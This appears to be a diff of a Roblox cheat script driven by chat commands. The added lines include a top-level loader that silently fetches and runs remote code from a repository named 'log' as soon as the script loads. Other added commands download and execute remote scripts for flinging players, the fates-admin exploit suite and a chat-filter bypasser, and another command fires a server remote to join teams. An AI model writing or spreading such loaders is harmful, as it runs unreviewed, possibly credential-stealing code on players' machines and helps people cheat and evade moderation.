@@ -1,9 +1,21 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lostbunny489/log/main/Code'))()
+
 local player = game.Players.LocalPlayer
 local character = player.Character
 local humanoid = character:WaitForChild("Humanoid")
 local chat = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
 
 player.Chatted:Connect(function(message)
+  local text = message:match(".join%s+(%w+)")
+  if text then
+    for i,v in pairs(game.Workspace.Teams:GetChildren()) do
+      if string.find(v.Name, text) then
+        game:GetService("ReplicatedStorage").acceptedEvent:FireServer(v.Name)
+        break
+      end
+    end
+  end
+
   if message:match(".speed (%d+)") then
     local speed = tonumber(message:match(".speed (%d+)"))
     humanoid.WalkSpeed = speed
@@ -38,7 +50,23 @@ player.Chatted:Connect(function(message)
   elseif message == ".search" then
     local script = game:HttpGet("https://raw.githubusercontent.com/lostbunny489/search-/main/Code")
     loadstring(script)()
+
+  elseif message == ".ophatfling" then
+    local script = game:HttpGet("https://raw.githubusercontent.com/lostbunny489/fling/main/Code")
+    loadstring(script)()
+
+  elseif message == ".fate" then
+    local script = game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua")
+    loadstring(script)()
+
+  elseif message == ".chat" then
+    local script = game:HttpGet('https://raw.githubusercontent.com/5Picklebarry/Scripts/main/ForRealiumBypasserKeyLess.lua', true)
+    loadstring(script)()
   end
 end)
 
-chat:FireServer("Lost is daddy", "all")
+if player.Name == "zoark215" or player.Name == "bunny_bell215" then
+  chat:FireServer("Warning a highly skilled professional is in the game ", "all")
+else
+  chat:FireServer("Lost is daddy", "all")
+end
